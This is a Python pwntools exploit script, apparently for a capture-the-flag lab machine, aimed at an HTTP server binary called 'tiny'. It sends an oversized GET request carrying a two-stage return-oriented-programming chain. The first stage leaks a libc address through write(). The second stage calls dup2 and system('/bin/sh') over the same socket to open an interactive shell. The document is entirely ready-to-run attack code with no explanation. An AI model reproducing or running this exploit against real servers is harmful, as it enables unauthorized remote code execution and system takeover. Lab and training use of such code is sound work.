#!/usr/bin/python
 
from pwn import *
 
HOST = "10.10.10.89"
PORT = "1111"
 
r = remote(HOST, PORT)
 
#context.log_level = 'DEBUG'
 
elf = ELF('/root/Desktop/smasherleak/tiny')
libc = ELF('/root/Desktop/smasherleak/libc.so.6')
 
log.info("Deploying stage 1 (Leak)...")
 
junk = "A" * 568
 
leak = flat(
    0x4011dd,       # 0x00000000004011dd : pop rdi ; ret
    0x4,            # fd
    0x4011db,       # 0x00000000004011db : pop rsi ; pop r15 ; ret
    elf.got['getpid'],
    "AAAAAAAA",
    elf.sym['write'],
    endianness = 'little', word_size = 64, sign = False)
 
payload = 'GET ' + junk + urlencode(leak) + '\r\n\r\n'
 
r.send(payload)
r.recvuntil("File not found")
leaked_getpid = u64(r.recv()[:8])
log.success("Leaked getpid@@GLIBC libc address: " + str(hex(leaked_getpid)))
 
libc.address = leaked_getpid - libc.sym['getpid']
 
log.success("Base libc address: " + str(hex(libc.address)))
log.success("Dup2@@GLIBC address: " + str(hex(libc.sym['dup2'])))
log.success("System@@GLIBC address: " + str(hex(libc.sym['system'])))
log.success("/bin/sh address: " + str(hex(libc.search('/bin/sh').next())))
 
log.info("Restarting socket...")
r.close()
r = remote(HOST, PORT)
log.success("Socket restarted successfully.")
 
log.info("Deploying stage 2 (Shell)...")
 
shell = flat (
    0x4011dd,               # 0x00000000004011dd : pop rdi ; ret
        0x4,                    # oldfd
        0x4011db,               # 0x00000000004011db : pop rsi ; pop r15 ; ret
        0x0,            # newfd
        "AAAAAAAA",
    libc.sym['dup2'],
    0x4011dd,               # 0x00000000004011dd : pop rdi ; ret
        0x4,                    # oldfd
        0x4011db,               # 0x00000000004011db : pop rsi ; pop r15 ; ret
        0x1,            # newfd
        "AAAAAAAA",
        libc.sym['dup2'],
    0x4011dd,               # 0x00000000004011dd : pop rdi ; ret
    libc.search('/bin/sh').next(),
    libc.sym['system'],
    endianness = 'little', word_size = 64, sign = False)
 
payload = 'GET ' + junk + urlencode(shell) + '\r\n\r\n'
 
r.send(payload)
r.interactive()
